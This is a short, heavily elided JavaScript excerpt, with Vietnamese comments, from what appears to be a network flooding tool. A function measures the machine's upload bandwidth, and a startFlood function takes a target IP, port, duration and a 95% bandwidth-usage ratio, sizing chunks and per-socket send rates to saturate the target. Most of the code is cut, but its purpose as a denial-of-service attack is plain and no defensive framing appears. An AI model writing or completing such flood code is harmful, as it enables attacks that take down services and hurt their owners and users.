...
async function getUploadMbps() {
    try {
        ...
        console.error(`[${process.pid}] ⚠️ Không đo được, dùng mặc định 100 Mbps`);
        return 100;
    }
}
...
async function startFlood(ip, port, durationSec, usageRatio = 0.95) {
    ...
    // Tự chọn chunkSize theo băng thông
    let chunkSize;
    ...
    const targetSocketSpeed = 20 * 1024; // mỗi socket gửi 20KB/s
